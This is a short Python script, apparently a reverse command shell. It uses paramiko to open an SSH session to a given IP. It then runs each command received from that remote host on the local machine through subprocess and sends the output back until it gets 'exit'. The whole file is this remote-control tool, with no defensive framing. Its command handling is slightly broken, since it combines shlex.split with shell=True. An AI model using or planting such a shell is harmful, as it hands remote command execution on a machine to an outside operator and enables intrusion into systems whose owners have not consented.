import subprocess
import paramiko
import shlex

def ssh_command(ip, port, username, password, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=username, password=password)

    session = client.get_transport().open_session()
    if session.active:
        session.send(command)
        print(session.recv(1096).decode())

        while True:
            try:
                cmd = session.recv(1096).decode()
                if cmd == 'exit':
                    client.close()
                    break
                output = subprocess.check_output(shlex.split(cmd), shell=True)
                session.send(output or 'OK')
            except Exception as E:
                session.send(f'Exception {str(E)}')
    client.close()
    return

if __name__ == '__main__':
    import getpass
    host = input('Enter IP: ')
    port = int(input('Enter port: '))
    username = input('Enter Username: ')
    password = getpass.getpass("Enter password: ")
   
    ssh_command(ip=host, port=port, username=username, password=password, command='Client Connected')